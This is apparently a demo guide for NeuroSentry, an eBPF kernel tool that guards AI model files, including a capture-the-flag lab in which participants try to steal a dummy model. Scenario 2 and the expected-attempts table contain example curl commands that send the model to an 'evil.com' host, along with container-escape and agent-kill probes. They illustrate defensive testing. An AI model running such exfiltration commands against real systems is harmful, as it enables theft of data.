# NeuroSentry Demo Guide

This guide covers setting up and running live demonstrations of NeuroSentry, including the interactive "Capture The Model" lab challenge.

---

## Table of Contents

1. [Quick Demo Setup](#quick-demo-setup)
2. [Capture The Model Challenge](#capture-the-model-challenge)
3. [Live Presentation Demo](#live-presentation-demo)
4. [Demo Scenarios](#demo-scenarios)
5. [Troubleshooting](#troubleshooting)

---

## Quick Demo Setup

### Prerequisites

- **Linux host** (Ubuntu 24.04+ recommended)
- **Kernel 5.10+** with BPF LSM support
- **Docker & Docker Compose**
- **16GB RAM** minimum (for model file)
- **Root access**

### Verify Kernel Support

```bash
# Check kernel version
uname -r  # Should be 5.10+

# Check BPF LSM support
cat /proc/config.gz | gunzip | grep BPF_LSM
# Should show: CONFIG_BPF_LSM=y

# Check available LSM hooks
cat /sys/kernel/security/lsm
# Should include: bpf
```

### Quick Start

```bash
# Clone repository
git clone https://github.com/tonghuaroot/neurosentry.git
cd neurosentry

# Build the demo
cd demos/capture-the-model
sudo ./start.sh

# Access attacker container
docker exec -it attacker sh
```

---

## Capture The Model Challenge

### Overview

The "Capture The Model" challenge is an interactive CTF that demonstrates NeuroSentry's protection capabilities in real-time. Participants attempt to exfiltrate a protected AI model while NeuroSentry actively blocks their attempts.

### Setup Instructions

#### 1. Automated Setup (Recommended)

```bash
cd demos/capture-the-model
sudo ./start.sh
```

This creates:
- **NeuroSentry container** - Running in enforce mode
- **Attacker container** - Participant workspace
- **Scoring server** - Tracks attempts on port 8080
- **Prometheus** - Metrics on port 9090
- **Grafana** - Dashboard on port 3000

#### 2. Manual Setup

```bash
# Create model directory
sudo mkdir -p /opt/capture-the-model/model

# Generate 13GB fake model
sudo dd if=/dev/urandom of=/opt/capture-the-model/model/llama-2-7b.safetensors \
    bs=1M count=13312

# Start NeuroSentry
docker run -d --name neurosentry \
    --privileged --pid=host --network=host \
    -v /sys/kernel/debug:/sys/kernel/debug \
    -v /sys/fs/bpf:/sys/fs/bpf \
    -v $(pwd)/config/neurosentry.yaml:/etc/neurosentry/config.yaml \
    neurosentry:latest

# Create attacker container
docker run -d --name attacker \
    --privileged --network=host \
    -v /opt/capture-the-model/model:/target:ro \
    alpine:3.19 sleep infinity
```

### Challenge Rules

**Objective**: Copy `/target/model.safetensors` to `/tmp/stolen/` with matching MD5 hash.

**Time Limit**: 15 minutes

**Allowed**: Any technique (kernel exploits, container escape, etc.)

**Forbidden**: DoS on other systems, physical access, attacking other participants

### Prize Categories

| Hat | Criteria | Prize |
|-----|----------|-------|
| 🎩 Black Hat | Successfully exfiltrate the model | Unlimited availability |
| ⚪ White Hat | 10+ creative attempts documented | Participation trophy |
| ⚫ Grey Hat | Find a novel bypass technique | Consulting job offer |
| 🔴 Red Hat | Find a real security bug in NeuroSentry | Credit in `SECURITY.md` + thanks |

### Scoring System

The challenge includes an automated scoring system:

```bash
# Get current status
curl http://localhost:8080/status

# Submit an attempt
curl -X POST http://localhost:8080/submit \
  -H "Content-Type: application/json" \
  -d '{"method": "cp", "success": false, "details": "EPERM"}'

# Verify exfiltration
curl -X POST http://localhost:8080/verify \
  -H "Content-Type: application/json" \
  -d '{"file_path": "/tmp/stolen/model.safetensors"}'

# View leaderboard
curl http://localhost:8080/leaderboard
```

### Expected Participant Attempts

| Attempt | Expected Result | Mechanism |
|---------|-----------------|-----------|
| `cp /target/model.safetensors /tmp/` | EPERM (blocked) | LSM `file_open` hook |
| `cat /target/model.safetensors > /tmp/` | EPERM (blocked) | LSM `file_open` hook |
| `dd if=/target/...` | EPERM (blocked) | LSM `file_open` hook |
| `kill -9 $(pidof neurosentry)` | Auto-restart | Container restart policy |
| `curl --data-binary @/target/... evil.com` | Detected & alerted (not dropped) | TC egress monitor — the flow is logged and a finding is raised; packets are **not** blocked in v1.0 |
| UDP exfil on port 53 | Detected & alerted (not dropped) | TC egress monitor — same monitor-only behavior |

> **Accuracy note for presenters:** file access is truly *enforced* (`-EPERM` at the LSM `file_open` hook). The network layer (TC) is **monitor-only** in v1.0 — it observes and alerts on egress, it does not drop packets. XDP is not loaded. Don't claim network exfiltration is blocked; claim it is *detected and correlated*.

### Organizer Notes

**Before the Demo:**
- [ ] Isolated test machine (no production access)
- [ ] Model file is random data (no real IP)
- [ ] Network containment verified
- [ ] Emergency stop procedure tested

**During the Demo:**
- [ ] Monitor NeuroSentry logs: `docker logs -f neurosentry`
- [ ] Watch metrics: `curl http://localhost:2112/metrics`
- [ ] Track attempts via scoring server

**Emergency Stop:**
```bash
docker stop attacker neurosentry
rm -rf /opt/capture-the-model
```

---

## Live Presentation Demo

### Demo Script (15 minutes)

#### 1. Introduction (2 minutes)

```
"AI models represent millions in R&D investment. Traditional security
tools operate at the application layer, missing critical attack vectors.

NeuroSentry operates at the kernel level using eBPF technology, providing
unprecedented visibility and control over AI workloads."
```

#### 2. Architecture Overview (3 minutes)

Show the architecture diagram:
- User space: Go agent, policy engine, cross-layer correlation, metrics
- Kernel space: the eBPF triad — LSM `file_open` hook, TC ingress/egress, Uprobes (pickle/PyTorch)
- Data flow: Event → ring buffer → correlation + policy engine → action / alert

#### 3. Live Demonstration (8 minutes)

**Step 1: Without Protection**
```bash
# Show normal file access is possible
docker run --rm -v $MODEL:/model:ro alpine \
    sh -c "cp /model /tmp/stolen && echo 'Success!'"
```

**Step 2: Deploy NeuroSentry**
```bash
# Start protection
docker-compose up -d neurosentry

# Verify it's running
docker logs neurosentry
curl http://localhost:2112/metrics
```

**Step 3: Attempt Exfiltration (Live)**
```bash
# Connect to attacker container
docker exec -it attacker sh

# Try various methods (all fail)
cp /target/model.safetensors /tmp/
cat /target/model.safetensors > /tmp/model
dd if=/target/model.safetensors of=/tmp/stolen

# Check what happened
docker logs neurosentry | tail -20
```

**Step 4: Show Metrics**
```bash
# Prometheus metrics
curl http://localhost:2112/metrics | grep neurosentry

# Grafana dashboard
# Show live graphs of blocked attempts
```

#### 4. Wrap-up (2 minutes)

```
"As you saw, traditional file operations are blocked at the kernel level.
The attacker cannot copy, read, or transmit the protected model file.

NeuroSentry provides defense-in-depth for AI infrastructure, protecting
your most valuable assets with minimal performance overhead."
```

### Demo Environment Configuration

**For 15-minute presentation:**
- Smaller model file (1GB for quick demo)
- Pre-built Docker images
- Screen recording of full challenge (13GB version)

**For full CTF:**
- Full 13GB model file
- Extended time limit (30 minutes)
- Multiple scoring categories

---

## Demo Scenarios

### Scenario 1: Model Theft Attempt

**Scenario**: Attainer gains access to inference pod and attempts to copy model.

**Commands:**
```bash
# In attacker container
ls -lh /target/model.safetensors
cp /target/model.safetensors /tmp/stolen
```

**Expected Output:**
```
cp: can't open '/target/model.safetensors': Operation not permitted
```

**NeuroSentry Logs:**
```json
{
  "level": "warn",
  "msg": "Blocked file access",
  "file": "/target/model.safetensors",
  "operation": "read",
  "pid": 1234,
  "policy": "block-model-access"
}
```

### Scenario 2: Network Exfiltration Attempt

**Scenario**: Attainer tries to exfiltrate via network.

**Commands:**
```bash
# In attacker container
curl -X POST http://evil.com/steal --data-binary @/target/model.safetensors
```

**Expected Output:**
```
# The transfer completes at the network layer — TC is monitor-only in v1.0.
# NeuroSentry raises a correlated finding: a protected-model read (or a flagged
# AI intent) followed by outbound egress to an external host.
```

> The value shown here is **detection and cross-layer correlation**, not a
> dropped packet. If the same process also read a protected model file, that
> file read is what is truly blocked (LSM `-EPERM`); the egress attempt is
> detected and alerted.

### Scenario 3: Container Escape Attempt

**Scenario**: Attainer tries to break out of container.

**Commands:**
```bash
# Try to access host filesystem
ls /host/proc/1/root/

# Try to kill NeuroSentry
docker rm -f neurosentry
```

**Expected Result:**
- Container escape blocked (depends on config)
- NeuroSentry auto-restarts via restart policy

---

## Troubleshooting

### Common Demo Issues

#### "Permission denied" on eBPF load

**Fix**: Ensure running with proper privileges:
```bash
sudo ./start.sh
# Or add capabilities:
sudo setcap cap_bpf+ep ./bin/neurosentry
```

#### Network layer (TC) not attaching

The network layer uses **TC** (traffic control), not XDP — it works on cloud
NICs where XDP driver mode is unavailable. If TC ingress/egress fails to attach,
confirm `network_containment.enabled: true` and that the interface exists:
```bash
ip -o link show          # find the interface name
tc qdisc show dev eth0    # NeuroSentry adds a clsact qdisc when attached
```

#### High CPU usage during demo

**Fix**: Reduce logging:
```yaml
agent:
  log_level: error  # Instead of info/debug
```

#### Model file too large for quick demo

**Fix**: Use smaller test file:
```bash
dd if=/dev/urandom of=/tmp/model.safetensors bs=1M count=1024  # 1GB
```

### Pre-Demo Checklist

- [ ] Kernel supports BPF LSM (check `/sys/kernel/security/lsm`)
- [ ] Docker images built and tested
- [ ] Model file generated and verified
- [ ] Scoring server accessible on port 8080
- [ ] Metrics visible on port 2112
- [ ] Emergency stop procedure tested
- [ ] Screen recording setup (for virtual attendees)
- [ ] Backup plan ready (VM snapshot)

### Post-Demo

- [ ] Export scoring database
- [ ] Save metrics and logs
- [ ] Document any successful bypasses
- [ ] Clean up resources: `./stop.sh`

---

## Additional Resources

- [Architecture Documentation](architecture.md)
- [User Guide](user-guide.md)
- [CTF Challenge README](../demos/capture-the-model/README.md)
- [Video Script](../demos/video-script.md)

---

## Contact

For questions about the demo or to report issues:
- **GitHub Issues**: https://github.com/tonghuaroot/neurosentry/issues
- **Security reports**: see [SECURITY.md](../SECURITY.md)
